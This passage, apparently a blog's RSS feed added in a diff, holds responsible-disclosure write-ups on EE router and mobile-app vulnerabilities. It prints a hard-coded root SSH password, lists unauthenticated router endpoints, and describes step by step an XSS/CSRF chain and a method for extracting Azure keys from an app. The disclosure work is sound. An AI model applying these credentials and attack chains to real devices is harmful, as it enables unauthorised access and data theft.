@@ -1,0 +1,577 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on James Hemmings ~ Blog</title>
+        <link>https://jamesit.github.io/posts/</link>
+        <description>Recent content in Posts on James Hemmings ~ Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>(C) James Hemmings 2021, all rights reserved.</copyright>
+        <lastBuildDate>Wed, 24 Oct 2018 00:00:00 +0000</lastBuildDate>
+        <atom:link href="https://jamesit.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>EE 4GEE HH70 Router Vulnerability Disclosure</title>
+            <link>https://jamesit.github.io/2018/10/24/ee-4gee-hh70-router-vulnerability-disclosure/</link>
+            <pubDate>Wed, 24 Oct 2018 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2018/10/24/ee-4gee-hh70-router-vulnerability-disclosure/</guid>
+            <description>After finding vulnerabilities in the 4GEE Mobile WiFi Router last year, I thought I would give my brand new EE home broadband router a run for it&amp;rsquo;s money and it seems like last time, it&amp;rsquo;s vulnerable to another attack vector, this time being hard-coded credentials for SSH root access, which luckily is only available via the LAN.
+This would enable any user on the LAN to gain access to the router using these hard-coded credentials.</description>
+            <content type="html"><![CDATA[<p>After finding vulnerabilities in the 4GEE Mobile WiFi Router last year, I thought I would give my brand new EE home broadband router a run for it&rsquo;s money and it seems like last time, it&rsquo;s vulnerable to another attack vector, this time being hard-coded credentials for SSH root access, which luckily is only available via the LAN.</p>
+<p>This would enable any user on the LAN to gain access to the router using these hard-coded credentials.</p>
+<p><strong>Update: 26/10/2018 - EE have released patch that fixes the issue. Users are recommended to follow the EE router upgrade process via the web UI.</strong></p>
+<p><strong>Hardware Version/Model:</strong> 4GEE Router HH70VB-2BE8GB3 (HH70VB) <strong>Vulnerable Software Version:</strong> HH70_E1_02.00_19 <strong>Patched Software Version:</strong> HH70_E1_02.00_21 <strong>Vulnerability CVE(s):</strong> CVE-2018-10532 <strong>Product URL:</strong> <a href="https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-router/details">https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-router/details</a></p>
+<h2 id="attack-proof-of-concept">Attack Proof of Concept</h2>
+<p>As shown below, by logging into the &ldquo;admin&rdquo; user over SSH, it is possible to then discover the hard-coded SSH password using strings on the web server binary. This is quite interesting, as the &ldquo;admin&rdquo; user password is changed once the WebUI admin user has changed also.</p>
+<p><img src="images/defaultcred1_redacted.jpg" alt=""></p>
+<p><img src="images/defaultcred2.jpg" alt=""></p>
+<h2 id="full-vulnerability-details">Full Vulnerability Details</h2>
+<p><strong>Weak Authentication / Default Admin Password (CWE-798)</strong></p>
+<p>An issue was discovered on EE 4GEE HH70VB-2BE8GB3 HH70_E1_02.00_19 devices.</p>
+<p>Hardcoded root SSH credentials were discovered to be stored within the &ldquo;core_app&rdquo; binary utilised by the EE router for networking services. An attacker with knowledge of the default password (&ldquo;oelinux123&rdquo;) could login to the router via SSH as the root user, which could allow for the loss of confidentiality, integrity, and availability of the system. This would also allow for the bypass of the &ldquo;AP Isolation&rdquo; mode that is supported by the router, as well as the settings for multiple Wireless networks, which a user may use for guest clients.</p>
+<p>An attacker must be able to communicate with the SSH server, however the router supports multiple networks and &ldquo;AP Isolation&rdquo; mode which could be bypassed if the malicious user compromises the router with the default credentials/hard coded SSH credentials.</p>
+<p><strong>Affected Component</strong>
+root@OpenWrt:/usr/bin# strings core_app | grep root
+sshpass -p oelinux123 scp <a href="mailto:root@192.168.225.1:%25s">root@192.168.225.1:%s</a> %s
+sshpass -p oelinux123 scp %s <a href="mailto:root@192.168.225.1:%25s">root@192.168.225.1:%s</a></p>
+<h2 id="remediation">Remediation</h2>
+<p>It appears that EE have mitigated this vulnerability by disabling SSH access completely, as shown below, after comparing both firmware update packages (Old/new).</p>
+<p>Although this does not fix the exact issue of hardcoded root credentials, it is still a mitigation.</p>
+<p><strong>Old:</strong> <img src="images/Old_Patch.jpg" alt=""></p>
+<p><strong>New:</strong><img src="images/New_Patch.jpg" alt=""></p>
+<h2 id="disclosure-timeline"><strong>Disclosure Timeline:</strong></h2>
+<p>29th April, 2018 at 12:52 GMT. Email sent with technical vulnerability information and PoC. 10th May, 2018 at 23:23 GMT. Followup email sent, no acknowledgement received. 11th May, 2018 at 06:47 GMT. Acknowledgement received from EE, remedial work being reviewed. 29th June, 2018 at 18:56 GMT. Followup email sent, noticed EE security patch email.. confirming if this fixes vulnerability. 29th June, 2018 at 19:01 GMT. Email from EE, still evaluating fixes of the vulnerability. 18th July, 2018 at 19:32 GMT. Email sent to EE, asking for update as 90 day window closing shortly. 18th July, 2018 at 22:12 GMT. Reply from EE, asking for IMEI and current S/W version. 19th July, 2018 at 15:14 GMT. Reply from EE, asking for exact steps to reproduce issue. 20th July, 2018 at 07:56 GMT. Email sent to EE with requested information. 4th October, 2018 at 22:58 GMT. Email sent to EE asking for update. 5th October, 2018 at 08:29 GMT. Reply from EE stating its patched. 5th October, 2018 at 19:51 GMT. Advised EE that its not patched on this version. 6th October, 2018 at 06:54 GMT. Reply from EE, stating they will check with their development team and will come back to me on Monday. 6th October, 2018 at 08:30 GMT. Email to EE acknowledging last email and that is OK. 6th October, 2018 at 08:40 GMT. Reply from EE asking for clarity on the vulnerability and the recommended fix, as well as the overall risk rating. 6th October, 2018 at 09:11 GMT. Email sent to EE with the requested information. 6th October, 2018 at 09:17 GMT. Reply sent from EE, mentioning the comments/advice is understood and they will be in touch on Monday. 8th October, 2018 at 21:50 GMT. Email sent to EE asking for fix ETA. 8th October, 2018 at 22:03 GMT. Reply from EE, advising they are still working on the issue and the options. Update to be provided tomorrow. 9th October, 2018 at 20:05 GMT. Reply from EE, confirming SSH functionality has been disabled in the fix and there is further verification required before an update is released. 9th October, 2018 at 20:13 GMT. Email sent to EE asking for approximate ETA and planned fix date. 9th October, 2018 at 20:16 GMT. Reply from EE, stating its being pushed through as a matter of urgency, that the fix has been verified and the binary is being compiled at the moment, further verification still required. 12th October, 2018 at 11:51 GMT. Email sent to EE, asking for approximate ETA. 12th October, 2018 at 12:43 GMT. Reply from EE, stating validation completed 20 minutes ago. Consumer package to be deployed rather than the test variant, will be released this week. 13th October, 2018 at 19:39 GMT. Email sent to EE, asking for notification when consumer version released. Stated I will hold public disclosure at present. 17th October, 2018 at 15:40 GMT. Reply from EE, stating validation has been completed, however theirs another minor change needed. Phone call to be conducted tomorrow to finalise build and if two changes are required or not. Feedback to be provided tomorrow. 18th October, 2018 at 19:02 GMT. Email sent to EE, asking for updates. 18th October, 2018 at 19:39 GMT. Reply from EE, testing has been completed but another update is going to be included and the bundle will be released early next week. 18th October, 2018 at 20:26 GMT. Email sent to EE, mentioning this was said last week and that I will be going public with vulnerability disclosure next Wednesday, as this is well over 90 day agreed disclosure period. 21st October, 2018 at 20:17 GMT. Reply from EE, stating they addressed the SSH issue by disabling it but another patch needs to be merged to manage customer experience. Original validation of vulnerability took longer than anticipated. 23rd October, 2018 at 18:05 GMT. Email sent to EE, asking for further updates. 23rd October, 2018 at 18:11 GMT. Reply from EE, stating release will be deployed Thursday and asking for IMEI. 24th October, 2018 at 20:01 GMT. Email sent to EE with IMEI.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>EE 4GEE Mobile WiFi Router - Multiple Security Vulnerabilities Writeup</title>
+            <link>https://jamesit.github.io/2017/08/24/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities-writeup/</link>
+            <pubDate>Thu, 24 Aug 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2017/08/24/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities-writeup/</guid>
+            <description>After performing security testing on the 4GEE Mobile WiFi router it was discovered to be vulnerable to several security vulnerabilities. These vulnerabilities in combination make it possible for an attacker to remotely exploit the device, which can be achieved through having a user view a crafted texted message that was sent to him.
+Other attacks are also possible by misleading and/or tricking users into executing code or clicking crafted URLs to trigger multiple functions such as device reset, device reboot, device restore (malicious config), sending SMS messages or stealing device configuration information, SMS messages and any other information on the device that a user may have access to and without authentication.</description>
+            <content type="html"><![CDATA[<p>After performing security testing on the 4GEE Mobile WiFi router it was discovered to be vulnerable to several security vulnerabilities. These vulnerabilities in combination make it possible for an attacker to remotely exploit the device, which can be achieved through having a user view a crafted texted message that was sent to him.</p>
+<p>Other attacks are also possible by misleading and/or tricking users into executing code or clicking crafted URLs to trigger multiple functions such as device reset, device reboot, device restore (malicious config), sending SMS messages or stealing device configuration information, SMS messages and any other information on the device that a user may have access to and without authentication.</p>
+<p>Additionally, multiple JSONP information disclosures were discovered, which display the full username and password of the administrative user while unauthenticated and allow access to multiple privileged functions such as device reset, device reboot and device configuration download/upload and SMS messages stored on the device.</p>
+<p>I&rsquo;d also like to note, the responsiveness and prompt vulnerability resolution from EE, as I was expecting this issue to get ignored or swept under the carpet, like most IOT/Router vulnerabilities, however in this case constant communication was kept throughout the process and the issues resolved.</p>
+<p><strong>Hardware Version/Model:</strong> 4GEE WiFi MBB (EE60VB-2AE8G83). <strong>Vulnerable Software Version:</strong> EE60_00_05.00_25. <strong>Patched Software Version:</strong> EE60_00_05.00_31. <strong>Vulnerability CVE(s):</strong> CVE-2017-14267, CVE-2017-14268, CVE-2017-14269. <strong>Proof of Concept Code:</strong> <a href="https://github.com/JamesIT/vuln-advisories-/tree/master/EE-4GEE-Multiple-Vulns">https://github.com/JamesIT/vuln-advisories-/tree/master/EE-4GEE-Multiple-Vulns</a></p>
+<h2 id="attack-proof-of-concept">Attack Proof of Concept</h2>
+<p>After finding multiple security vulnerabilities, I decided to chain a number of these together to achieve device compromise remotely via SMS using Stored XSS and CSRF vulnerabilities, which clearly demonstrates the need for even low risk vulnerabilities being patched, as once other issues are found they can be used to achieve further levels of access, as I highlight below.</p>
+<p>So firstly, I decided to create the malicious binary file that we will upload to the victim&rsquo;s device, by modifying the username and password.</p>
+<p><img src="images/Attack1-1.png" alt=""></p>
+<p>Next, I modified the device SSID and the network WPA2 key, which would deny the user access to the device, as the password and network information would have changed.</p>
+<p><img src="images/Attack2-1.png" alt=""></p>
+<p>The binary configuration file was then saved to the attackers machine with the file name of &ldquo;configure.bin&rdquo;.</p>
+<p><img src="images/Attack3-1.png" alt=""></p>
+<p>I then used the &ldquo;Restore backup&rdquo; option within the router administration page to intercept the  POST request and generate the needed payload for the exploit, which in this case due to the binary data was using JavaScript XHR to send the request data. Additionally, I modified the payload options to submit the request automatically.</p>
+<p><img src="images/Attack6-1.png" alt=""></p>
+<p>The request was then saved to a text file on a remote web server as &ldquo;r.js&rdquo; with the HTML data stripped, thus leaving only the specific function with the XHR data intact.</p>
+<p><img src="images/Attack8.png" alt=""></p>
+<p>Next, I then sent an SMS text message to the routers phone number with the XSS payload of &lsquo;<em>&quot;&gt;<!-- raw HTML omitted --><!-- raw HTML omitted --></em>&rsquo;. The specific name of &ldquo;r.js&rdquo; was used, as the remote device hides data over a specific length within the SMS list page and thus would not be executed correctly.</p>
+<p><img src="images/Attack9.png" alt=""></p>
+<p>As you can see within the screenshot below, upon viewing the SMS Inbox the remote JavaScript payload is included within the webpage, thus executing the JavaScript XHR request to upload the binary data to the &lsquo;/goform/uploadBackupSettings&rsquo; webpage.</p>
+<p><img src="images/Attack10.png" alt=""></p>
+<p>Finally, the device configuration was modified with the uploaded binary data thus compromising the device integrity and locking the user out of the device, which would require device reset.</p>
+<p><img src="images/Attack11.png" alt=""></p>
+<p>The home page was then accessed, confirming the router SSID of &ldquo;Hacked Router&rdquo;. Additionally, other venues of exploitation, would be to change the network proxy and provider settings which would allow an attacker to perform man in the middle attacks against the device, thus compromising it&rsquo;s confidentiality.</p>
+<p><img src="images/Attack12.png" alt=""></p>
+<h2 id="full-vulnerability-details">Full Vulnerability Details</h2>
+<h6 id="sms-list---stored-cross-site-scripting-xss">SMS List - Stored Cross Site Scripting (XSS)</h6>
+<p>The 4GEE SMS Inbox webpage is vulnerable to Stored Cross Site Scripting (XSS) within the “SMS_Content” parameter retrieved by “getSMSlist”, which allows an attacker to send malicious scripts to an unsuspecting user via SMS text messages and once executed an attacker could steal user cookies, device information, SMS messages or in this specific case reset the device to an attacker’s configuration, thus completely taking control of the device and its settings.</p>
+<p>The first step in exploiting the vulnerability was to send an XSS payload to the routers mobile phone number provided by EE, as demonstrated below.</p>
+<p><img src="images/InboxStoredXSS1.png" alt=""></p>
+<p>The SMS viewer webpage was then opened from within the router administration panel on &lsquo;<a href="http://ee.mobilebroadband/default.html#sms/smsList.html?list=inbox'">http://ee.mobilebroadband/default.html#sms/smsList.html?list=inbox'</a>.</p>
+<p><img src="images/InboxStoredXSS2.png" alt=""></p>
+<p>Next, the response from the &lsquo;smsList&rsquo; GET request was returned with the XSS payload data within the &ldquo;sms_content &quot; parameter.</p>
+<p><img src="images/InboxStoredXSSResponse.png" alt=""></p>
+<p>Finally the JavaScript payload was executed, displaying the domain context of &lsquo;ee.mobilebroadband&rsquo;.</p>
+<p><img src="images/InboxStoredXSS3.png" alt=""></p>
+<h6 id="connections-list--stored-cross-site-scripting-xss--cross-site-request-forgery-csrf">Connections List – Stored Cross Site Scripting (XSS) &amp; Cross Site Request Forgery (CSRF)</h6>
+<p>The 4GEE Connections List &amp; Profile Management webpage is vulnerable to Stored Cross Site Scripting (XSS) and Cross Site Request Forgery (CSRF) within the “Name” parameter, which allows an attacker to send malicious scripts to an unsuspecting user via CSRF to then execute arbitrary JavaScript code on execution, which could then compromise sensitive SMS messages and/or data.</p>
+<p>The first step to exploiting the vulnerability was to visit the &ldquo;Profile Management webpage on &lsquo;http://192.168.1.1/default.html#connection/profileManagement.html&rsquo; with the profile name parameter being set to &lsquo;1&rsquo; and then sent to Burp Suite by clicking &ldquo;Save&rdquo;.</p>
+<p><img src="images/StoredXSS1.png" alt=""></p>
+<p>Next, the request was sent to the CSRF PoC generator via the &ldquo;Action&rdquo; button. In this case, an anti-CSRF token was noted &ldquo;_TclRequestVerificationToken&rdquo; in the request and was not added to the subsequent proof of concept code.</p>
+<p><img src="images/StoredXSS2.png" alt=""></p>
+<p>The &ldquo;Test in browser&rdquo; option was then selected, which was successful as demonstrated in the screenshot below.</p>
+<p><img src="images/StoredXSS4.png" alt=""></p>
+<p>Additionally, as shown below the XSS payload was triggered from the &ldquo;Connection Status&rdquo; page in addition to the &ldquo;Profile Management&rdquo; webpage.</p>
+<p><img src="images/StoredXSS3.png" alt=""></p>
+<h6 id="restore-configuration--cross-site-request-forgery-csrf">Restore Configuration – Cross Site Request Forgery (CSRF)</h6>
+<p>The 4GEE configuration restore functionality is vulnerable to Cross Site Request Forgery (CSRF) attacks, which can be used by an attacker to execute any “GET” or “POST” requests that are not protected, in this case it allowed for an attacker to specify and upload a malicious binary configuration file that once uploaded, restores to the uploaded configuration. The application should implement robust refer header checking and/or anti-CSRF tokens that prevent the request when not sent with such requests.</p>
+<p>The first step was to intercept the &ldquo;uploadBackupSettings&rdquo; webpage using Burp Suite and then send such request to CSRF PoC generator using the &ldquo;Action&rdquo; tab.</p>
+<p><img src="images/RestoreCSRF2.png" alt=""></p>
+<p>The payload was then automatically set to XHR and the option to &ldquo;Test in browser&rdquo; was selected to verify the vulnerability and it&rsquo;s exploit vector.</p>
+<p><img src="images/RestoreCSRF3.png" alt=""></p>
+<p>Finally, the option to &ldquo;Submit request&rdquo; was selected from the webpage, with the subsequent request being captured in Burp Suite, showing the context and refer of &ldquo;http://burp&rdquo;.</p>
+<p><img src="images/RestoreCSRF4.png" alt=""></p>
+<p>As shown below, the binary configuration data was uploaded to the device causing it reboot.</p>
+<p><img src="images/RestoreCSRF5.png" alt=""></p>
+<h6 id="sms-redirection--cross-site-request-forgery-csrf">SMS Redirection – Cross Site Request Forgery (CSRF)</h6>
+<p>The 4GEE SMS Forwarding functionality is vulnerable to Cross Site Request Forgery (CSRF) attacks within the “SMS Forwarding” web page, which can be used by an attacker to execute any “GET” or “POST” requests that are not protected, in this case it allowed for the redirection of any received SMS message once a user clicks a specially crafted URL or background script. The application should implement robust refer header checking and/or anti-CSRF tokens that prevent the request when not sent with such requests.</p>
+<p>The first step was to visit the <em>&lsquo;http://192.168.1.1/default.html#sms/smsForwarding.html&rsquo;</em> webpage, with my mobile phone number then being entered into the &ldquo;Mobile Phone Number&rdquo; input field.</p>
+<p><img src="images/SMSRedir_1.png" alt=""></p>
+<p>Next, the &ldquo;Apply&rdquo; button was selected and the request intercepted within Burp Suite. Notice the presence of the &ldquo;_TclRequestVerificationToken&rdquo;, which in this case will be removed within the proof of concept, by sending the request to CSRF PoC generator as shown below.</p>
+<p><img src="images/SMSRedir_2.png" alt=""></p>
+<p>The &ldquo;Test in browser&rdquo; option was then selected from the CSRF PoC generator screen, with the request then being submitted and intercepted within Burp Suite. As demonstrated below by the referer header and lack of anti-csrf token.</p>
+<p><img src="images/SMSRedir_3.png" alt=""></p>
+<p>Finally, the presence of the vulnerability is confirmed by the SMS forwarding service being enabled and set to the attackers phone number, allowing an attacker to hijack all incoming SMS messages sent to the device via CSRF attacks.</p>
+<p><img src="images/SMSRedir_6.png" alt=""></p>
+<h6 id="router-reset--reboot--cross-site-request-forgery-csrf">Router Reset &amp; Reboot – Cross Site Request Forgery (CSRF)</h6>
+<p>The 4GEE Reset/Reboot Router functionality is vulnerable to Cross Site Request Forgery (CSRF) attacks within the “System” web page, which can be used by an attacker to execute any “GET” or “POST” requests that are not protected, in this case it allowed for the remote device reset of the 4GEE device once a user clicks a specially crafted URL or background script. The application should implement robust refer header checking and/or anti-CSRF tokens that prevent the request when not sent with such requests.</p>
+<p>The first step was to select &ldquo;Reset&rdquo; from the System section of the administration panel, located on &lsquo;http://192.168.1.1/default.html#settings/systemSetting.html&rsquo;.</p>
+<p><img src="images/ResetCSRF1.png" alt=""></p>
+<p>Next, the request was intercepted within Burp Suite and then sent to CSRF PoC generator via the &ldquo;Action&rdquo; button.</p>
+<p><img src="images/ResetCSRF3.png" alt=""></p>
+<p>The option to &ldquo;Test in browser&rdquo; was then chosen, with the &ldquo;Submit request&rdquo; then being clicked, as demonstrated below  with the referer of &ldquo;http://burp&rdquo;.</p>
+<p><img src="images/ResetCSRF4.png" alt=""></p>
+<p>Finally, the router reset was completed confirming the presence of such vulnerability.</p>
+<p><img src="images/ResetCSRF6.png" alt=""></p>
+<h6 id="internet-connectdisconnect--cross-site-request-forgery-csrf">Internet Connect/Disconnect – Cross Site Request Forgery (CSRF)</h6>
+<p>The 4GEE Connect/Disconnect functionality is vulnerable to Cross Site Request Forgery (CSRF) attacks within the “Connection Status” web page, which can be used by an attacker to execute any “GET” or “POST” requests that are not protected, in this case it allowed for the remote disconnection of the 4GEE device once a user clicks a specially crafted URL or background script.</p>
+<p>The &ldquo;Disconnect&rdquo; option was firstly selected and then intercepted within Burp Suite.</p>
+<p><img src="images/InternetDC_CSRF1.png" alt=""></p>
+<p>Next, the request was sent to Burp Suite CSRF PoC Generator by selecting the &ldquo;Action&rdquo; menu.</p>
+<p><img src="images/InternetDC_CSRF2.png" alt=""></p>
+<p>The request was then sent to &ldquo;Test in browser&rdquo; and the option to submit the request was chosen, as identified below.</p>
+<p><img src="images/InternetDC_CSRF3.png" alt=""></p>
+<p>Finally, the users internet connection was disconnected.</p>
+<p><img src="images/InternetDC_CSRF5.png" alt=""></p>
+<h6 id="multiple-unauthenticated-jsonp-information-disclosures">Multiple Unauthenticated JSONP Information Disclosures</h6>
+<p>The 4GEE router uses various JSONP endpoints to retrieve and/or set data, which are vulnerable to unauthenticated information disclosure of sensitive configuration data, settings, administration password and SMS messages/lists, such unauthenticated disclosures could be remotely retrieved using CSRF/XSS/Phishing attacks previously disclosed or via unauthorised users.</p>
+<p>The following endpoints have been deemed to be vulnerable:</p>
+<p>[sourcecode language=&ldquo;plain&rdquo;] http://192.168.1.1/goform/getPasswordSaveInfo http://192.168.1.1/goform/getSMSAutoRedirectSetting http://192.168.1.1/goform/getSMSStoreState http://192.168.1.1/goform/getSMSReportlist http://192.168.1.1/goform/getSingleSMSReport?rand=0.133713371337 http://192.168.1.1/goform/getNetworkInfo http://192.168.1.1/goform/getSingleSMS?sms_id=1&amp;amp;amp;amp;amp;amp;amp;amp;rand=0.133713371337 http://192.168.1.1/goform/getProfileList http://192.168.1.1/goform/getRouterInfo http://192.168.1.1/goform/getSimcardInfo http://192.168.1.1/goform/getWlanInfo http://192.168.1.1/goform/getWlanClientInfo http://192.168.1.1/goform/getSysteminfo http://192.168.1.1/goform/getWanInfo http://192.168.1.1/goform/getImgInfo http://192.168.1.1/goform/getDMZInfo http://192.168.1.1/goform/getUsbIP?rand=0.13371337 http://192.168.1.1/goform/getUsbIP?rand=0.13371337 http://192.168.1.1/goform/getMACFilterInfo[/sourcecode]</p>
+<p>After viewing various responses and requests within Burp Suite, various endpoints were accessed while not authenticated to the web application, which resulted in sensitive information being disclosed, such as the device username, password and SMS messages, as demonstrated below.</p>
+<p><img src="images/Password.png" alt=""></p>
+<p><img src="images/SMSContent.png" alt=""></p>
+<h2 id="disclosure-timeline"><strong>Disclosure Timeline:</strong></h2>
+<p><em>27th July, 2017 at 21:32 GMT. Email sent with technical vulnerability information and PoC.</em> <em>27th July, 2017 at 22:00 GMT. Response from EE devices manager, confirming receipt of PoC.</em> <em>31th July, 2017 at  18:47 GMT. Update from vendor, patches being developed for reported issues.</em> <em>1st August, 2017 at 10:43 GMT. Reply sent to vendor.</em> <em>10th August, 2017 at 10:32 GMT. Update from vendor, patches still being developed.</em> <em>18th August, 2017 at 12:11 GMT. Email sent to vendor asking for update/ETA.</em> <em>18th August, 2017 at 12:15 GMT. Response from vendor, updates to be released on Monday.</em> <em>18th August, 2017 at 12:30 GMT. Reply sent to vendor with device IMEI for online update process.</em> <em>22nd August, 2017 at 15:54 GMT. Response from vendor, beta firmware released to verify  changes.</em> <em>23rd August, 2017 at 21:29 GMT. Reply sent to vendor, vulnerabilities successfully patched.</em> <em>24th August, 2017 at 09:32 GMT. Response from vendor, patch publicly released to customers.</em> <em>24th August, 2017 at 12:00 GMT. Full disclosure via Blog.</em></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Azure Cloud Root Keys (Insecure Storage) - Responsible Disclosure</title>
+            <link>https://jamesit.github.io/2017/07/23/azure-cloud-root-keys-insecure-storage-responsible-disclosure/</link>
+            <pubDate>Sun, 23 Jul 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2017/07/23/azure-cloud-root-keys-insecure-storage-responsible-disclosure/</guid>
+            <description>Back in February I found an Android application which is used by the emergency services, that had exposed Azure API keys within the application leading to potential compromise of sensitive incident reports, attachments, and infrastructure server &amp;ldquo;.vhd&amp;rdquo; files with the access level to spin up new instances or delete them. I immediately reported this to the application developer and it&amp;rsquo;s respective organisation under responsible disclosure, which resulted in an instant and prompt response, which I give huge kudos for.</description>
+            <content type="html"><![CDATA[<p>Back in February I found an Android application which is used by the emergency services, that had exposed Azure API keys within the application leading to potential compromise of sensitive incident reports, attachments, and infrastructure server &ldquo;.vhd&rdquo; files with the access level to spin up new instances or delete them. I immediately reported this to the application developer and it&rsquo;s respective organisation under responsible disclosure, which resulted in an instant and prompt response, which I give huge kudos for.</p>
+<p>OWASP Defines this class of vulnerability as &ldquo;Insecure Data Storage&rdquo;:</p>
+<blockquote>
+<p>Insecure data storage vulnerabilities occur when development teams assume that users or malware will not have access to a mobile device&rsquo;s filesystem and subsequent sensitive information in data-stores on the device. Filesystems are easily accessible. Organizations should expect a malicious user or malware to inspect sensitive data stores. Rooting or jailbreaking a mobile device circumvents any encryption protections. When data is not protected properly, specialized tools are all that is needed to view application data [1].</p>
+</blockquote>
+<h2 id="vulnerability-details">Vulnerability Details:</h2>
+<p>Firstly, when I saw the keys I went straight to Azure documentation to see what level of access such keys could give and Azure states that the account storage key is akin to the &ldquo;root password&rdquo; and that it should NOT be hard-coded or stored as plain text, where in this case it was embedded into an application &ldquo;.apk&rdquo; [2].</p>
+<p><img src="images/azure.png" alt=""></p>
+<p>So you may be wondering, how did I obtain such keys from the APK? Well I used an online service named &ldquo;<a href="http://www.javadecompilers.com/apk">http://www.javadecompilers.com/apk</a>&rdquo;, which decompiles APK files using JADX into zip format.</p>
+<p>Next, I then used &ldquo;grep -R &lsquo;key&rsquo; .&rdquo; to search for strings within the APK such as &ldquo;password&rdquo; &ldquo;api&rdquo; and &ldquo;key&rdquo; which resulted in the discovery of &ldquo;Accountkey=XXX&rdquo; and &ldquo;AccountName=XXX&rdquo; on further inspection. As you can see below within the &ldquo;AzureConnection.java&rdquo; file, both account name and account key was discovered along with the container name of &ldquo;attachments&rdquo;.</p>
+<p><img src="images/app.png" alt=""></p>
+<p>Next, I downloaded the Linux Azure CLI toolkit from Microsoft and connected to the instance issuing the &ldquo;container list&rdquo; function. This retreived some VERY Interesting containers such as &lsquo;attachments&rsquo;, &lsquo;uploads&rsquo; and &lsquo;vhds&rsquo;. I was most intrigued of the fact, &lsquo;vhds&rsquo; existed and after viewing the file names, it confirmed my suspicion that I had access to their server virtual machine files and could compromise their infrastructure with such access.</p>
+<p><img src="images/azure1.png" alt=""></p>
+<p>I then retrieved the contents of the &lsquo;vhd&rsquo; container by issuing the command &lsquo;storage blob list&rsquo; for the container &lsquo;vhds&rsquo;, which highlighted multiple server VHD files that I could download and/or modify.</p>
+<p><img src="images/azure2.png" alt=""></p>
+<h2 id="feedbacksuggestions"><strong>Feedback/Suggestions:</strong></h2>
+<p>I would suggest that the organisation reviews the application against the OWASP Mobile Testing Top 10 [1], to discover further vulnerabilities that could put the organisation at further risk.</p>
+<p>An attacker with access to the vulnerability discovered, would be able to severely compromise the organisation due to the incident reports present on Azure, along with other sensitive files and information like Azure Cloud VHD files, which Microsoft recommends against storing in plain-text or hard-coded format [2], to prevent against this attack an API should be used between the application and Azure cloud server.</p>
+<p>Finally, despite not being able to disclose the organisation name or application I would like to say thank you to them for handling this issue in a prompt and respective manner, which resulted in a good result for both parties involved, as now the application is secure.</p>
+<p><img src="images/email.png" alt=""></p>
+<h2 id="references"><strong>References:</strong></h2>
+<p>[1] <a href="https://www.owasp.org/index.php/Mobile_Top_10_2016-M2-Insecure_Data_Storage">https://www.owasp.org/index.php/Mobile_Top_10_2016-M2-Insecure_Data_Storage</a> [2] <a href="https://docs.microsoft.com/en-us/azure/storage/storage-configure-connection-string">https://docs.microsoft.com/en-us/azure/storage/storage-configure-connection-string</a> [3] <a href="http://www.javadecompilers.com/apk">http://www.javadecompilers.com/apk</a></p>
+<h2 id="disclosure-timeline"><strong>Disclosure Timeline:</strong></h2>
+<p><em>17th</em> <em>February, 2017 at 01:32 GMT. Email sent requesting security contact information.</em> <em>17th February, 2017 at 15:36 GMT. Response from vendor/org requesting full details.</em> <em>17th February, 2017 at 16:00 GMT. Full technical details sent to company director.</em> <em>17th February, 2017 at 16:13 GMT.  Response from vendor/org stating they will look into it/resolve urgently.</em> <em>16th July, 2017 at 22:50 GMT.  Email sent asking for update on vulnerability resolution.</em> <em>22nd July, 2017 at 13:21 GMT.  No response, further email sent asking for permission if I can disclose with organisation name/details via Blog.</em> <em>22nd July, 2017 at 23:35 GMT.  Response received from company director. Company does not wish app or name to be included in disclosure.</em> <em>23rd July, 2017 at 10:00 GMT.  Full Disclosure via Blog.</em></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>GoodSAM App - CSRF/Stored XSS Chain Full Disclosure</title>
+            <link>https://jamesit.github.io/2017/07/17/goodsam-app-csrf/stored-xss-chain-full-disclosure/</link>
+            <pubDate>Mon, 17 Jul 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2017/07/17/goodsam-app-csrf/stored-xss-chain-full-disclosure/</guid>
+            <description>I&amp;rsquo;ve been a user of the mobile/web application named &amp;ldquo;GoodSAM App&amp;rdquo; which is an application where the Ambulance service in London or the East Midlands can dispatch &amp;ldquo;Responders&amp;rdquo; who are trained in Basic Life Support (BLS) and can be dispatched to cardiac arrests or other priority calls and users at emergencies can also request a &amp;ldquo;Responder&amp;rdquo;. Now this application is absolutely brilliant in the nature of what it does and I fully support them.</description>
+            <content type="html"><![CDATA[<p>I&rsquo;ve been a user of the mobile/web application named &ldquo;GoodSAM App&rdquo; which is an application where the Ambulance service in London or the East Midlands can dispatch &ldquo;Responders&rdquo; who are trained in Basic Life Support (BLS) and can be dispatched to cardiac arrests or other priority calls and users at emergencies can also request a &ldquo;Responder&rdquo;.  Now this application is absolutely brilliant in the nature of what it does and I fully support them.</p>
+<p>Despite this however, I did find two vulnerabilities within the application that may have been overlooked. Specifically Cross Site Request Forgery (CSRF) within the &ldquo;Account Profile&rdquo; page, along with Cross Site Scripting (XSS) within the same page, the account profile page being loaded upon login.</p>
+<p>Now typically, CSRF and XSS issues on their own are not that much of a critical vulnerability in the grand scheme of things, however in this instance it was possible to chain both CSRF/Stored XSS vulnerabilities to set the XSS payload within the account profile fields and then steal the user cookie every time they login or view the page.</p>
+<p>Finally, as the GoodSAM Data Protection section said they take data protection seriously, I thought I would not have any problems getting these vulnerabilities resolved under responsible disclosure, however I was wrong on this occasion and have had to release the information. (See Disclosure Issues section).</p>
+<blockquote>
+<p>&ldquo;We take your data protection extremely seriously. We are registered with the Information Commissioners Office (no: ZA094052) and our technology team take the security of our data and servers very seriously. &quot;</p>
+</blockquote>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<p>The first vulnerability discovered was Cross Site Request Forgery (CSRF) within the account profile page, which per OWASP documentation is defined as [4][5]:</p>
+<blockquote>
